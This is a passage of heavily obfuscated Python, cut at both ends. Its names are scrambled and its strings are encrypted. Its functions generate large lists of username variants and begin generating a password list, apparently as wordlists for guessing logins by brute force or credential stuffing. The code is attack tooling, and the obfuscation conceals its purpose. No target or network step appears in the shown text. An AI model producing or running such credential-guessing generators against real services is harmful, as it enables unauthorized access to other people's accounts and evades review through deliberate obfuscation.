_1Ol10I0O0O(b'\xc7!\xb2\rT\xf9M<\xe0\x8d\xe7', b'\xc2\xa2.H'), _1Ol10I0O0O(b'\xc1n\x13 \x9fD-\xea\xec)', b'#ae\xda'), _l1OIOIOIIOIIl01I(b'\x93\xb64\x85\x8b]\xb1\xc29)\xd8\xa2G\x8d\x0c\xc0', b'\x02\xe6\xc1q'), _l1OIOIOIIOIIl01I(b'E\xdaA', b'\xec\x94N\x16'), _OIlO10OIO1O1(b'\xc3\xc6u\x83"7\t', b'\x14}\xb3!'), _OIlO10OIO1O1(b'\xb4`\xc0\xf3*h\x90\xe4\xf8', b'\xd8\x82\xb6\x04'), _1Ol10I0O0O(b'\xb4\x82\xc1\x91s\x88-zb\xf5\r\x15', b'\x07uk\xe8'), _1Ol10I0O0O(b'\x84\x83y\xd9\xee\x1c\x0e', b'1\xfc\xc7j'), _1Ol10I0O0O(b'\xae<\xb5\x17V\\)\xb2', b'\xcc6\x1c\xa3'), _l1OIOIOIIOIIl01I(b'Ejj\xc1\xb8\x9d\xbd\xbd', b'\xb1\x1e\x06N'), _OIlO10OIO1O1(b'-\xdaK\xdbF\x9a\xd7\xeb', b'4\xee\x95Z'), _l1OIOIOIIOIIl01I(b'0\x96\xf2a\xa3\xd5\xe31', b'\xb6|a\x97'), _1Ol10I0O0O(b'S\xb0\xd9\xe4o5\xd4\x9c\xf3\xdf\xcb', b'\x93\xd7?\x85'), _l1OIOIOIIOIIl01I(b'\xac\xd5\xe7s\xf7\xb4^[\xde', b'\xe2\xc7_4'), _1Ol10I0O0O(b'.\xbe\xad\xdbT\xa8/\x18\xb2', b'\x0eO^\xbe'), _OIlO10OIO1O1(b'n\xf3r?4\x8fxwQ\xda\x8a\xce\xe7TW9\x0b\x82\x03.\x0flO\xa1', b'M\x06#\xd9'), _OIlO10OIO1O1(b'N\xf4\x93\xcc\x8e_\xae\xc4\xe6p\xcc\xcf\xe5\xa6m\xe4', b'\xb3v\xddd'), _1Ol10I0O0O(b'7\xd8\xe9(5\xc8n3p\xb4\xf2:J\xeeu\xc9', b'\xb9N/\xf1'), _1Ol10I0O0O(b'\xc3\x15Mwy\xb3', b'\xeb\x82V\xbe'), _l1OIOIOIIOIIl01I(b'\x97*\x81\x0c\t/\x98\x00', b'\x9f\t\xd3\xa1'), _1Ol10I0O0O(b'\x12\x1eRL\x83\xde', b'R\x10\xa8\xb3'), _OIlO10OIO1O1(b's\xc5Z\xf5\x10\x11\x12\x8d\x8f\x81\x977.', b'\x0e#sU')], _l1OIOIOIIOIIl01I(b'\x96.\tB7\xb8"\xa1\xc3)\xd5M', b'\x1b\xbc\xd9t'): [_l1OIOIOIIOIIl01I(b'h\x9f+\xe7\x8bh~Z', b'\x8d\xcb\xe6\xfc'), _1Ol10I0O0O(b'<\xa3\x11\xaa\xe6', b'"\x15\x9e\x86'), _OIlO10OIO1O1(b'\x80f\x97\xe9D\xd0', b'LV\x95\xd3'), _1Ol10I0O0O(b'\x00#s\x13+', b'\xa3wPe'), _l1OIOIOIIOIIl01I(b'\xe6{_\x8cBQ\xea7*\\\x86', b'\xf2\x08\x17w'), _l1OIOIOIIOIIl01I(b'\x0f \rj\t\x84\xf4\\', b'd%\xb4\xc4'), _OIlO10OIO1O1(b'H\xcc\xb9e\xb0\xa3M\xb8d\x95\x84\x10N\xaf', b'\x9d\xd8\x01\xb4'), _1Ol10I0O0O(b'\\\xd1q@(b\xcf\xfe\xe7\xd3\x00\x86\xbe>\xe4u', b']o\xd3w'), _l1OIOIOIIOIIl01I(b'\xff\xa3\xedE\xe4\x85\xcd\x8fB=\xa0\xe4\xca\xf6w', b'&\x0e\xa0V'), _OIlO10OIO1O1(b'\xdfF]\x8b\xdb', b'W*\xdb\xe5'), _l1OIOIOIIOIIl01I(b'\x0c\xe1\xc3\xefM', b'\x1fvd\x01'), _1Ol10I0O0O(b'e\xb6', b'\xe1\xe8\x0c\xdc'), _1Ol10I0O0O(b'\xc6\xbe\x90\x1cs', b'`\xa3\x9f6'), _l1OIOIOIIOIIl01I(b'\xef\xd2\xe2s\x19|HV', b'<\x933f'), _l1OIOIOIIOIIl01I(b'\\1\x9bv\xd1', b'\xcf\xc0p\xd3'), _OIlO10OIO1O1(b'\xb8W\x96\x9dA\xf0', b'\xe3\x80\xb6\xb9'), _OIlO10OIO1O1(b'r\xbb\xe1\xc0\x9b1', b'a\xaeyO'), _1Ol10I0O0O(b'\x7f\xfa\xf1\xe4B#\xd7q\xfb', b'/\x91G\xd9'), _l1OIOIOIIOIIl01I(b'?\r\xde\xad\xf0\xff\x12\xd4\xb8I', b'\x80\x88\x1f\xbd'), _l1OIOIOIIOIIl01I(b'{\xb7\x1a\x17o}\x88\xfeORd\xe6@|\x06', b'9\xe1\xddW'), _l1OIOIOIIOIIl01I(b'+X"\x8c\xccgp^\x08\xbc\xc0\xa7\xe1A\xd7', b'v\xaa\xbdp')], _1Ol10I0O0O(b'Z\xf3\xda\x99\x02\x11!\xbf\x18f\x12\xcd\x07?', b'\x88\x936\xe6'): [_l1OIOIOIIOIIl01I(b'`\xa5\xee\xf2\xce\xfc\x9c\x94p\xb1)\xa0', b'F*A\xad'), _OIlO10OIO1O1(b'\x84p\xact`\xd3k:VP', b'\xe8n+u'), _1Ol10I0O0O(b'\xcd\xec\xea\xa6\x9e\xf6,\xee\\S', b'M`,A'), _1Ol10I0O0O(b's\xad\x97\xf3c\xa1\xbb\r\x01o\xf0\x10', b'\xf8L\xc5N'), _1Ol10I0O0O(b'2\x11\xb2\xd1\x7f\x91\n', b'*3kx'), _OIlO10OIO1O1(b'5y\xe5\xae\xe2\xac\xbc.E\xd5V', b'k\x8a\xd3\xab'), _1Ol10I0O0O(b'\x10\xec\\|I`\x1b\xea\x18\xd5', b'Ah\x9e%'), _1Ol10I0O0O(b'J\xf7W\xa2\x136u^\x13B\xe7\xea`', b'n*oC'), _1Ol10I0O0O(b'\xfbK\xd1>\xf7\xfe\xa8\xda\xa4\xa7\x85z\x1c', b'4j\xdau'), _1Ol10I0O0O(b'\xb4/\xd1\xad\xfa\x0e\xdd\nN:\xfb', b'\x99\xff<3'), _1Ol10I0O0O(b'\x1c\xc5\x00\xd1', b'\t\xd0h{'), _OIlO10OIO1O1(b'\x0f#\xec\x8b\x14\xa9\xba', b'\xc0gU2'), _OIlO10OIO1O1(b'4SU\xef\xa4\xb5\xb1\x11\xa6\xbb\x08!\x86v\xe5&', b'\x8d\xfb\xd5\x16'), _l1OIOIOIIOIIl01I(b'\xb7\x07>l({\xe7\xe4', b'\x06\xf1\x84q'), _l1OIOIOIIOIIl01I(b'L\xa3\xb5~kv\x8c\xc4\xfc\x0b\xde\x1f\\+', b'I$\r\xb6')], _1Ol10I0O0O(b'\x1f\xfe.<\xc5\xe6I\x11)', b'\xbd\xb2UE'): [_OIlO10OIO1O1(b'/\xf2/\xc2h}', b')\xf0=\xd8'), _OIlO10OIO1O1(b'\x81V\xad\x1b\xfa', b'\xbdI\xf4\xfe'), _l1OIOIOIIOIIl01I(b'V\x0fu\xc2\x86\xbf\x95\xf4\xa4\xf2', b'\x93\x9e\xf3\x12'), _OIlO10OIO1O1(b'\x8c\xb1\xf3~\xdc\xe8\xf2\xfb}\xb3\xdf', b'N9\xe0I'), _OIlO10OIO1O1(b'+|\xdf\x1ara8\x0b\xb3F', b'\x185\xda\xa6'), _l1OIOIOIIOIIl01I(b'\x85i+\xafh\xdb\x8e\x83', b'8\xad\x92\x1f'), _1Ol10I0O0O(b'\xcbo\xf2\x8aG\xc0\x99N\xc9\x17\xe8', b'\x1a\x9by\x9c'), _OIlO10OIO1O1(b'\xc7\x9d6\xf2\x844z\xc8T\xeei', b'\xda\xe9`\x0f'), _l1OIOIOIIOIIl01I(b';\x04GbJ\xda\xa8\x1amc', b'\xb1\x83\x91\xb9'), _l1OIOIOIIOIIl01I(b'A\x03\xddeE\xfc\xcf5\xa2\x0f\xa8U\x0e\x88s', b'\xa9%\xdc\x84'), _OIlO10OIO1O1(b'U\xa4w\x8ay\xf8i[\xdc\xab\xdb\xa3\xc9\x0eXz', b'_\xd0A\x10'), _l1OIOIOIIOIIl01I(b'\x90\x9d*\xa3\x12\xa0\x8dW\x02', b'\xce\xed\xc5\x8b'), _OIlO10OIO1O1(b'\xfc\xc9\xdfW\x1f\xca\x1f\x1a^\xc7', b'\xab\x99`\xaa')], _1Ol10I0O0O(b'\xaf\xf7\xbb\x1bU\xc6\xf7z}$\x14\xd8', b'\xcf\xb0t\xcd'): [_1Ol10I0O0O(b'\xc8.\n\x1d\x07\xf0\x87\x9eC\xfd<', b'y\x96L\x08'), _l1OIOIOIIOIIl01I(b'K\x82\xa6\xb7E*\xbfR\xc4\xd3\x01lN', b')\xab\xb09'), _OIlO10OIO1O1(b'T\xf0\n$\xdcY&\x15', b'\xbe\t\xfa\xe0'), _OIlO10OIO1O1(b'7\x1b\x18\xac\xbc\x92\xf4!U\xd5GD', b'b\xd8Tk'), _OIlO10OIO1O1(b'G\xf0\xb6"n@I\x0e\xa7\xa0\xdd\x8f\xa0\x7f', b'cec\xd3'), _l1OIOIOIIOIIl01I(b'q\x1c\xc9\xfcGV\x95$A', b'7\x1e_\n'), _OIlO10OIO1O1(b'\xadL\x87\\\xa5\x7f{\x85<\x10J', b'\x9e\xec\xe4='), _OIlO10OIO1O1(b'\x05^\xe8\x05gW*+\xa7\xbd\xb5\x86o', b'(\xb9|\x03'), _1Ol10I0O0O(b'\xbb\x84\x0b~\x8b\xd9v\xb3', b'\xe5\xe8\xe4\xed'), _OIlO10OIO1O1(b'\xaa)\xed-\xe9\xc2d\x82\xc8\xef\xf3\xf2\xba\x1e\x12D\xa7\x80', b'\xd3~\xbb\x88'), _l1OIOIOIIOIIl01I(b'\x9f\x14Oq\xf0\x80<"ZL\xc5<\xe8BlY-H\x19\xe8\x8c\x10\xba', b'\xed\x1b\x8e\xd8'), _1Ol10I0O0O(b'\xf9\xd3\xf7&oS', b'\xfc\x98l\xf6'), _l1OIOIOIIOIIl01I(b'\xf4^\x1d\x8dO', b'Wh!K'), _OIlO10OIO1O1(b'\xfe\xc4\xe54\xedo\tg\xec\xd2', b'\x1d\x90#\xce')], _l1OIOIOIIOIIl01I(b'\xf8\xc2\t\xc3\x82\xaf\xdc\n\x9d)\xee\x96', b'L\xa5\x8c\xb8'): [_l1OIOIOIIOIIl01I(b'\x12`L\xab6\x9fn\x91\x85', b'V\xc7a\xbe'), _l1OIOIOIIOIIl01I(b';\x04\x1a\x94\x97\xe8\xd3l', b'<\xb5\xf3A'), _l1OIOIOIIOIIl01I(b'|\xc3X\xe0tt\xf8', b'\x8e\x8d!\xe0'), _OIlO10OIO1O1(b'KF\xcc\x9b$\x8d\xbd\xcc', b'\xc9\xd6p\xa4'), _l1OIOIOIIOIIl01I(b'\xce\x85\xc1\xce\x04', b'\x01\xfdy\xe3'), _OIlO10OIO1O1(b'H\x04\x1a\xd4\xf3\xb6\x05`\xf1\\h\xed\xb0\x82\xf4`', b'\xc7o\xdf\xf8'), _l1OIOIOIIOIIl01I(b'\xedH\x04\x12\x0e\xa6\x03', b'\xe5\xc9\xf1\xbc'), _1Ol10I0O0O(b'$Q\xac\x915\t\x94\xc3\x13', b'e\x94^\xc5'), _OIlO10OIO1O1(b'\x8e\xb8.3\x131\x0fE\xc3', b'\xcb\xb4\x91~')], _1Ol10I0O0O(b'|\x9b\x0b\xe6\xd5\xd9\xed\x03!6', b'\xd5\x10\xd3\x00'): [_l1OIOIOIIOIIl01I(b'\xf6\xcf\x11\x06\x0b', b'\xd2i\xa56'), _1Ol10I0O0O(b"K'1E\x8a\x07", b"\xe0\xd0'j"), _l1OIOIOIIOIIl01I(b'Eh&tm\x7f\r', b'\xb2\xdc\xf6\x08'), _1Ol10I0O0O(b'A\x08\x08<\x8ci#\xa8\x87\x81', b'\xe0\x9cb\xd4'), _OIlO10OIO1O1(b'iP\xa1\xf2\xe6\xa7\xe9\xc6\xf6', b'\xbb\xc4\x93\x99'), _1Ol10I0O0O(b'\xe4\xa6\xcej\xd4\xd8\x88\x91Zp]\xfb', b'.\x8c\x95\xad')]}
_IIIO1I10O100Oll0O = []
for _1I1I1lI1OOO01lOll0 in _1lOIO0Il1l0I101lI.values():
    _IIIO1I10O100Oll0O.extend(_1I1I1lI1OOO01lOll0)

def _llO1I1O01I1O0():
    _OIIIlOIO00OOl0IOl = [_l1OIOIOIIOIIl01I(b'um\x02\xe8\x94', b'\xcb\xe8q\x02'), _OIlO10OIO1O1(b'<\x0e\xc9\x14\xfd\x01\xa3?\x18\xb7\x80E$', b'P\xd5\x18"'), _1Ol10I0O0O(b'\xbb\x9b\ro', b'^\x99\xfc '), _l1OIOIOIIOIIl01I(b'Z\xd6\xf9;', b'_\xcc2X'), _l1OIOIOIIOIIl01I(b'\xa6\x8dR\x03', b'\xa6xe\xeb'), _OIlO10OIO1O1(b'\x1ff\x92J\xfd', b'\xb0\xa3g\xd4'), _OIlO10OIO1O1(b'k&\x9aT\x0b\xd9\x9f', b'\xc2\xaf\x8e\xb4'), _1Ol10I0O0O(b'5>.C\xad\xae\x11\xdfX)', b'\xba\xe6\xde\x1b'), _OIlO10OIO1O1(b'\xab\x8b\x00\xb0\xee\xce5a', b'\xae\xbc]\x97'), _1Ol10I0O0O(b'\x1f\x07g\x1c/\xab~\x1a?', b'\xa0&g\xd9'), _OIlO10OIO1O1(b'Lw\x87;!\xc5\xf7', b'f1|\x89'), _1Ol10I0O0O(b'/J\xce\x15', b'\x18\xffp\xfa'), _OIlO10OIO1O1(b'{Q$\x87K\x14u\xf7', b'%v\x83\xd4'), _OIlO10OIO1O1(b'SR\x7f\xa5\x0e\x02', b'\x00\xc1\x87^'), _1Ol10I0O0O(b'\xe8\x049;|/wF\xbb', b'\x02\x9b\xf4\xc3'), _OIlO10OIO1O1(b'\xf2\xbbk\x15\xbd\x98\x15\xa1\xe8', b'\xd4\xa9\xb0Z'), _OIlO10OIO1O1(b'k\xeb\xbcu/J\xacG\xf8', b'\xe4\x99\x0c\x9b'), _OIlO10OIO1O1(b'\x12\xf2gb,c\x179\x18v\x95', b'ov\x9d\xac'), _1Ol10I0O0O(b'\x8b\xfa~\xf1\x1c\xda', b'\xb0\xf7\x14\xe7'), _1Ol10I0O0O(b'\x84\xfb/\xad\xb5\x17', b'\x000\xf5{'), _1Ol10I0O0O(b'\xdf#\x11', b'P\xaa\xbc\xa3'), _1Ol10I0O0O(b'(\x1e\xb6\x7f\x0e&\x04i', b'\xad\x15\xb7\xca'), _OIlO10OIO1O1(b'e\x13\xa8bJ<\xdd', b'`\x85\xaa\x05'), _OIlO10OIO1O1(b'\xe5\xe4', b'\xe7\x1e\xde\xd8'), _OIlO10OIO1O1(b"'*\x13", b'99\xca2'), _OIlO10OIO1O1(b'\xf5Qc\xe3x\xc5\x13j\x07', b'\nMsQ'), _1Ol10I0O0O(b']\x84(_r\x8adz', b'\xb87\x96z'), _OIlO10OIO1O1(b'\xc7(\x13\xc5\xeb&W>$\x98', b'bBz\xfb'), _1Ol10I0O0O(b'!\x13\xe9\x94V', b'\x97\x12\x92&'), _1Ol10I0O0O(b'&\xf4\t\x13_gt\x9f', b',=Qh'), _1Ol10I0O0O(b'\x08\xfd\xe8\x8bwh', b'\xe3\xef\x85\xa3'), _1Ol10I0O0O(b'\xb0\xdcq\xfb?5J', b'\xf4\xe8\x9c\x0f'), _1Ol10I0O0O(b'\x19%\xb5\x95\x0e\xcc-\xa2\x90', b'\xdb\xf8\xf7$'), _l1OIOIOIIOIIl01I(b'\x97*\xfdl[1\xd2s\xad$C', b'Bezh'), _1Ol10I0O0O(b'\x8b\xbb\xa4,<2\xc4\x82I\x84', b'\xd6\xe6%@'), _l1OIOIOIIOIIl01I(b'\xdf\xd0y~Z\x02<', b'\xe8\xae\x97)'), _1Ol10I0O0O(b'\xe5Qf\x1a\xfd\xc5n\xe7H\xd9', b'\xf1O\xa0\xc4'), _OIlO10OIO1O1(b'\xb1cz\xab\x0f\xb0?', b'\x88\xcbA\x00'), _1Ol10I0O0O(b'\xd1w\xd5\xe6\xc2T\xce', b'w\x84\x96 '), _OIlO10OIO1O1(b'\xda\xff\xecj\x86', b'\xbb\x90`,'), _OIlO10OIO1O1(b'y|/\x1e\xb6', b'\xa5\x93\x0e\x94'), _1Ol10I0O0O(b'\t\xed42O\xb2\xc7', b'\x8b,\n\xd6'), _l1OIOIOIIOIIl01I(b'\xb1#u\xdb\x8c\xd7\xb9', b'\x82\xd2e\x83'), _OIlO10OIO1O1(b'%x\x93\x9b\x0c\x86', b'\x91K\x97.'), _l1OIOIOIIOIIl01I(b'\x83\x08\xc7\x7f\xae', b'\xed#5\xc8'), _OIlO10OIO1O1(b'$\xeb\x81;+@\xd7\x95\nCN\x86\xffh', b'\x9c\xedr*'), _1Ol10I0O0O(b'w\xa3\x0f\xfc\x10\x83\xa1', b'\x95\xc5\xe2\x07'), _OIlO10OIO1O1(b'\xe2\xa2t\n\x10+\x1f', b'\x07\xab\xd9\xf2'), _l1OIOIOIIOIIl01I(b'\\\xb6', b'(\x89Nr'), _l1OIOIOIIOIIl01I(b'\xef\x97]\xb7?\xafm\xfaa', b'\x9b#\xba+'), _OIlO10OIO1O1(b'\xf2\xf0.\xbbm', b'\xff\xaa\x9fa'), _OIlO10OIO1O1(b'_\xa4\xab\xfd\x0e\xa5\xc1\xc0\xe1\xba', b'\x1b\x10\x9c&'), _l1OIOIOIIOIIl01I(b'\xdc\x82\xf9\xb4\x7f\xaaW', b':\x9dC\xc1'), _l1OIOIOIIOIIl01I(b"~\x1e\x92\xa4'\xef\xab\x92\xe6\x9bs", b'?m\x7fT'), _l1OIOIOIIOIIl01I(b'\x97\x7fAK\\\xa8\x14i', b'\x9a\x14S\x8b')]
    usernames = []
    for _II10lIOOOOO in _OIIIlOIO00OOl0IOl:
        usernames.append(_II10lIOOOOO)
        usernames.append(_II10lIOOOOO.capitalize())
        usernames.append(_II10lIOOOOO.upper())
        usernames.append(_II10lIOOOOO.lower())
        for _IOl101I1l0lO in [_1Ol10I0O0O(b'(\x03\xbf', b'\xfd\x8c\xf3\x87'), _1Ol10I0O0O(b'\xbe\xac1\xac', b'*\xdeos'), _l1OIOIOIIOIIl01I(b'\xf6I\xb2&w', b'\xc4\xbcN\x8d'), _1Ol10I0O0O(b'\xa0\x04\x0f\xab', b'fi\x83\xa0'), _1Ol10I0O0O(b'\xdf[\xd1\xdc', b"\x00'\xf9b"), _l1OIOIOIIOIIl01I(b'\x8c\xfa\xe3\x0b}\xa9', b'\x19G5\x1c'), _OIlO10OIO1O1(b'\x03', b'\x08l\xb6@'), _1Ol10I0O0O(b'\xe3', b'\x07\xb84%'), _l1OIOIOIIOIIl01I(b'\xc5', b'#\xbe\xd4\xae'), _OIlO10OIO1O1(b'\xf9', b'\xe3\x01\xc0\x03'), _l1OIOIOIIOIIl01I(b'\\', b'G)4\x1d'), _1Ol10I0O0O(b'A\x8d', b'\x83{\x9e&'), _OIlO10OIO1O1(b'\xb7\x10', b'\x01\xdc\x7fN'), _OIlO10OIO1O1(b'\xffwM', b'\xf8\x97\x1as')]:
            usernames.append(_II10lIOOOOO + _IOl101I1l0lO)
            usernames.append(_II10lIOOOOO.capitalize() + _IOl101I1l0lO)
            usernames.append(_II10lIOOOOO + _OIlO10OIO1O1(b't', b'Z\x8c\x14\x9b') + _IOl101I1l0lO)
            usernames.append(_II10lIOOOOO + _l1OIOIOIIOIIl01I(b'\xc7', b'_f\xf1\xf1') + _IOl101I1l0lO)
            usernames.append(_II10lIOOOOO + _OIlO10OIO1O1(b'\xd4', b'\xfc\xf7\xb1\x16') + _IOl101I1l0lO)
        for _Il1I10I00O in [_1Ol10I0O0O(b'\xeb', b'C\xa6\xfd\xcb'), _OIlO10OIO1O1(b'G', b'\x7f\xf8\xba\x94'), _l1OIOIOIIOIIl01I(b'\xb2', b'!\xa73\x8c'), _1Ol10I0O0O(b'Z', b'N\x85\x03x'), _l1OIOIOIIOIIl01I(b'k', b'\x06\x0fJ\xd5'), _1Ol10I0O0O(b'U', b'\x13\xec8\x8e'), _1Ol10I0O0O(b'!', b'H\xb1m\xd9')]:
            usernames.append(_II10lIOOOOO + _Il1I10I00O)
            usernames.append(_II10lIOOOOO.capitalize() + _Il1I10I00O)
            usernames.append(_II10lIOOOOO + _Il1I10I00O + _l1OIOIOIIOIIl01I(b'\x9e\x83`', b'\xd2\xd2,X'))
            usernames.append(_II10lIOOOOO + _Il1I10I00O + _OIlO10OIO1O1(b'\x8b\x86\x88\x81', b'\xc3\x88*1'))
    for _ in range(292181320 ^ 292181376):
        name = _l1OIIl0IIlOO1O1Il.choice(_OIIIlOIO00OOl0IOl)
        _IOl101I1l0lO = _l1OIIl0IIlOO1O1Il.randint(2132983006 ^ 2132982970, 1923577881 ^ 1923571478)
        usernames.append(f'{name}{_IOl101I1l0lO}')
        usernames.append(f'{name}_{_IOl101I1l0lO}')
        usernames.append(f'{name}{_IOl101I1l0lO}123')
    return list(set(usernames))[:355863040 ^ 355863016]

def _0IOl0lIOOOl():
    _Ol1001l0O1O = [_1Ol10I0O0O(b'\x9a\xeb\x96\xbd\x8b', b'\xdc\x08\x9aw'), _l1OIOIOIIOIIl01I(b'\xa4\x8ar\xd2\x93i\xe4\xfc', b'\xcd\x01,\xf9'), _1Ol10I0O0O(b'r\xda\xa2\xc15}', b'\xa2p1\r'), _1Ol10I0O0O(b'0{\xc2\xe5*A\xee)', b']\x85HE'), _1Ol10I0O0O(b'$I#m', b'\xb0\xa8W\xeb'), _1Ol10I0O0O(b'\x1b\xb9\x81\x1ag\xf9', b'\xa2\x08\xb5\xa3'), _l1OIOIOIIOIIl01I(b']c\x9b\xf0\x1dn', b'\xd1\x95\x96\xd5'), _OIlO10OIO1O1(b'\xca\xacc9B\xd5\x84\x1c', b'\x0b3\xdb\xb7'), _l1OIOIOIIOIIl01I(b'c\xa2\x17%j\x9fG\xc7\xb1H\xa3', b'\xe9\x96\xffm'), _l1OIOIOIIOIIl01I(b'\xc8{\xd0\x8d', b'?w\x03\xab'), _OIlO10OIO1O1(b'\xb4Z\x104\x19\x00\xa0\x91\xdb\xf2\x8d', b'\xc7\xb3\xef\xbb'), _1Ol10I0O0O(b'\xdf\x8f\x10<_\xe2\x1a\xcd\xce', b'\xf1\x02}}'), _l1OIOIOIIOIIl01I(b'\xdd\xae\xd9\x1c\xc2X\xa9\xa7{', b"u'\x86Q"), _1Ol10I0O0O(b'|Q\x83x\xbe\x9f\xdc', b'z\x82\xe3\x11'), _1Ol10I0O0O(b':\xe7\xdf^1\x06\xff', b'\xeb5\x99\x91'), _l1OIOIOIIOIIl01I(b'\x11\xb5eI[\xba', b'H\r\xc3M'), _OIlO10OIO1O1(b'\x19\x16\x8e7\x88\x89', b'\x8bI\x7f9'), _1Ol10I0O0O(b'W\xed\xfdd\x06\x04', b'\xc0\x1cJ\xc7'), _1Ol10I0O0O(b'\x84+(\xad\xa6k&\xf4\xd7', b'\xc9\x8e?\x7f'), _1Ol10I0O0O(b'\x1b\xa0\x97\xe7Pc/\xb66', b'\x1d\x91\x80\xc7'), _1Ol10I0O0O(b'NO\xf9\xad\xcf\xd4\xfacD\x93', b'\x1f\xf0\x91w'), _l1OIOIOIIOIIl01I(b'\x13\xfc\xd0|\xa4+\x7fM\x06c', b'\xd0U\xb9\xdb'), _l1OIOIOIIOIIl01I(b')\xf4E\x9dM \x00\xf0.\x98\xc2\xf4', b'\x87E\x87\x8d'), _1Ol10I0O0O(b'\xf1\xce\x1bnF\xe70\x08\xb1\xa1\x01\xde', b'\xf2\xc3z#'), _1Ol10I0O0O(b'\xb9\x1c\xa7\x87\xc6\x8d\x18\x02', b'\xfb\xfaQ\xd3'), _OIlO10OIO1O1(b'\xf7\xa7\x91s\xec/\xce\x9d', b'\xdaa\xb9\x15'), _1Ol10I0O0O(b'S\xef@+\xd2\x12\xe2\xd6\x9cj\xe7', b'\xcb\xed\x0b\x8b'), _l1OIOIOIIOIIl01I(b' \xfb\xb5Ks\x1bZ-E\xa8A', b'\x12\x03\xfb\xf1'), _1Ol10I0O0O(b'\xab\xfd\x95\xbf\\\x9cI}[+RD', b'\x12m\xd33'), _1Ol10I0O0O(b"\xd3\x1b\xda'\x9bE0X\xef\xa05\xe5", b'\x8a^[Z'), _1Ol10I0O0O(b'\x9c\x99R)\x96\x86 0\x99\xf8\x92\xeb1', b'\xa6\xaaa%'), _OIlO10OIO1O1(b' \xe9\xb5\xd3\xb7\x86\x19\x04\x04\xf7\xfe\x14\x97', b'\xc4^\x15\xd4'), _OIlO10OIO1O1(b'\xf8\xe7$A\xaa\xa2-', b'H#\xbc\xa9'), _1Ol10I0O0O(b'E\x11\x02\xed\x82X\xda', b'\x15\xad\xe8\xaf'), _OIlO10OIO1O1(b'\xd6\x8a\x04\xa5\xbb\xa8_i', b'\xaa\xe2\t\xf7'), _OIlO10OIO1O1(b'F\r\x8e\x82\xd6\xa7LV', b'\xca\x07\xc3\x99'), _1Ol10I0O0O(b'Z\xf9\xe5\xce\xd2\xb9\xca', b'\xd4{\xb4q'), _1Ol10I0O0O(b"q\xc4\xf7\xb9\xe3`'", b'\xfc\xa1Jc'), _l1OIOIOIIOIIl01I(b'\xdc\xf4\xe8\x00$\x16_\xa6', b'\xa0\x8d\xbcH'), _OIlO10OIO1O1(b'd\xfb\xc9w\xdd\x03\xae=', b"'!\xe1\xe6"), _l1OIOIOIIOIIl01I(b'\x8fS\x96h\x1a', b'\xe8\xcb\x17,'), _OIlO10OIO1O1(b'\xb4YtM\xa5', b'\x02OT\xf8'), _l1OIOIOIIOIIl01I(b'\x9d\x1baF\xad,', b'HDT!'), _OIlO10OIO1O1(b'\xd0`\x17\xc1\xe0\x94', b'\xf8\xa5c\xd2'), _1Ol10I0O0O(b'\x15\x11/|\xf9\xaf', b'T\xf0N\\'), _1Ol10I0O0O(b'\xdd\xb8\x9e\xf2?e', b'6^\t\xf4'), _1Ol10I0O0O(b'\xd9(\xbd\xf4\xdd[', b'\xb5\xea\xffP'), _l1OIOIOIIOIIl01I(b'\xb46\xa8\xa3:P', b'\xc2\xdd\xa8\xdf'), _l1OIOIOIIOIIl01I(b'\xb3}.f\xdf-', b'\xbb\xff~9'), _1Ol10I0O0O(b'\x91\xd5\x1b\x86\xd5\xb8', b'6\xb3\xb6\xbc'), _1Ol10I0O0O(b'P\xe9L\xf4\xc2k', b'\x94\x9a\xbf\xc7'), _l1OIOIOIIOIIl01I(b'Cbe$\xe7\xbf', b'\xd6\xe4\x1e\xf6'), _l1OIOIOIIOIIl01I(b'\xb1u\xe9\xb1o\xf9\xf9\xdf\x1b', b'\xa3\xba \xf3'), _OIlO10OIO1O1(b'1\x91\xb7A\x04\xc6', b'\xe7mNT'), _1Ol10I0O0O(b'\xf4\xcb\x01u\x0f\xc9N*m', b's\x8ab\xdb'), _l1OIOIOIIOIIl01I(b'y\x7f\x12H\xbeb', b'\x16\x1dg.'), _1Ol10I0O0O(b'g\x11\xa8\xdb\x14\x85\x0e\x1c\xe6', b'\x18\xf8\xd6\xc7'), _OIlO10OIO1O1(b'm@\xf5A\xf0\xab\xaa\xd5', b'\xe5s\x9f\xd7'), _OIlO10OIO1O1(b'\x10GZ\xc9\xca\xd2\xa3\xff\x94\xaa/', b'\x07\x8e\x9b\x80'), _l1OIOIOIIOIIl01I(b'Z\xda\xb10\x1bO\x0b\x1b\n', b'\x8b\xb3\xb0\xd5'), _1Ol10I0O0O(b'\xd8n\xc1u.\xfe', b'\x83B\xcd\x86'), _l1OIOIOIIOIIl01I(b'\xd2\x19%\xf3$\xd9d,a', b'\xa1\x99\xd6\xc7'), _l1OIOIOIIOIIl01I(b'\xfc\x1c\xb1\xef\xfc\x86\x7f\x18', b'O\xf2\xd8\xac'), _1Ol10I0O0O(b'\xa1<.]=a\xcd2*\x07\x88', b'\xa7\xf9\xbb\xab'), _l1OIOIOIIOIIl01I(b'\t9\xac9\xc0\xf3t\xdf', b'\x90eNd'), _1Ol10I0O0O(b'\xe20I\xf1\xfb\xee\x8b{]\xf4&', b'\x10f\x1cs'), _OIlO10OIO1O1(b'\xad\xdc3b\xa7^>\x1a\xdb', b'\xc8\x97\xecZ'), _OIlO10OIO1O1(b'\xef\xe9~\xd9[;]j\xc7', b'\xc4\x844\x07'), _l1OIOIOIIOIIl01I(b'S\x15\xf1\x97o7', b"\xe8'\xcc\x0e"), _l1OIOIOIIOIIl01I(b'D\xea\x81g\xe0kb\x91\x96', b'^~\xf7"'), _1Ol10I0O0O(b'\xdd0\xa2irH\x0f\xcc', b'\xed\xb5:\xb7'), _1Ol10I0O0O(b'\xdc\xba\x9a\xb2\x9c\xb6##/\xb8U', b'4\xed\nu'), _OIlO10OIO1O1(b'\xf4\x1f?\xd0\x997R\xa6', b'\x18V\x06\x91'), _OIlO10OIO1O1(b'\xc6\xe2q\x13\x94\xa5g\xc1ll*', b'\x067\xa7p'), _OIlO10OIO1O1(b'\xd9,\xc7]\xb5\x9b', b'Ym{h'), _l1OIOIOIIOIIl01I(b'\x919\xd4\x87..?\xb8|', b'D?K\xdc'), _OIlO10OIO1O1(b'\xe222\xac>O\xc3byB', b'>\xf0u&'), _1Ol10I0O0O(b'E\x06\x96\xfbN\x97A u\xf0\xbd\x9b_', b'xP\xfb\xc4'), _OIlO10OIO1O1(b'EM\x8c\xc5^\xb5', b'\x9by~\xa9'), _1Ol10I0O0O(b's&\xe1\xc9?y\xf0iO', b'\x81\xd2\xd4i')]
    passwords = []
    for _0lOO1OOl01OO in _Ol1001l0O1O:
        passwords.append(_0lOO1OOl01OO)
        passwords.append(_0lOO1OOl01OO.capitalize())
